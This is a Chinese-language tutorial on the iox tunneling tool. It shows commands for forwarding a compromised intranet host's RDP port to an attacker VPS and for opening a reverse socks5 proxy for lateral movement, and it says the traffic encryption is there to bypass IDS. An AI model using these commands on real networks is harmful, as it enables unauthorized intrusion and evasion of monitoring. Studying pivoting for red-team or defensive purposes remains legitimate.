iox 是一款功能强大的端口转发、内网代理工具，功能类似于 lcx、ew，但是比他们更好！

[iox/docs/README_CN.md at master · EddieIvan01/iox](https://github.com/EddieIvan01/iox/blob/master/docs/README_CN.md)

# fwd 转发模式

```shell
#监听本地 8888 端口和 9999 端口，将两个连接间的流量进行转发
./iox fwd -l 8888 -l 9999
#监听本地 8888 端口和 9999 端口，将两个连接间的流量进行转发，流量加密
./iox fwd -l *8888 -l *9999 -k 656565
#监听本地 8888 端口将流量转发到 39.99.251.19 机器的 9999 端口
./iox fwd -l 8888 -r 39.99.251.19:9999
#监听本地 8888 端口将流量转发到 39.99.251.19 机器的 9999 端口，流量加密
./iox fwd -l *8888 -r *39.99.251.19:9999 -k 656565
#连接 39.99.251.19:8888 和 39.99.251.19:9999, 在两个连接间转发流量
./iox fwd -r 39.99.251.19:8888 -r 39.99.251.19:9999
#连接 39.99.251.19:8888 和 39.99.251.19:9999, 在两个连接间转发流量，流量加密
./iox fwd -r *39.99.251.19:8888 -r *39.99.251.19:9999 -k 656565
```

## 将内网主机RDP端口转发到VPS上

获得了位于内网的一台主机的权限，并且知道了他的登录用户名和密码。他的 3389 端口只对内网开放，现在需要将该主机的3389 端口映射到公网 VPS 的 3389 端口，那样，连接 VPS 的3389 端口就相当于连接内网主机的 3389 端口

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1740539797160-c935f2d2-e4bc-4194-872e-703a577210bc.png)

```shell
# vps
./iox fwd -l *9999 -l 3389 -k 656565
# 目标机
iox.exe fwd -r 10.211.55.7:3389 -r *39.99.251.19:9999 -k 656565
# 然后连接 39.99.251.19 的 3389 端口即可
```

注：被控主机和 VPS:8888 之间的流量会被加密，预共享的密钥是'AAA'，iox 会用这个密钥生成种子密钥和 nonce（**正常来讲，不应该复用 nonce。但是考虑到iox 的加密功能仅仅为了绕过 IDS 等设备，为了不额外分配空间，TCP 流加密会复用 nonce**），并用 Xchacha20 流加密

# proxy 代理模式

## socks5反向代理

获得了一个位于内网的通过 NAT 方式对外提供服务的主机的权限，现在需要对其所在的内网继续进行渗透。于是，就需要通过iox建立一个 socks5 隧道代理，让我们的主机可以通过隧道访问其内网。

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1740540239754-4bd659e6-6685-4a33-9057-2d6acfda3d03.png)

```shell
# vps
./iox proxy -l *9999 -l *1080 -k 656565
# 目标机器
#将流量转发到 39.99.251.19 的 9999 端口
iox.exe proxy -r *39.99.251.19:9999 -k 656565
# 接着连接 socks5 39.99.251.19 的 1080 端口即可。
```
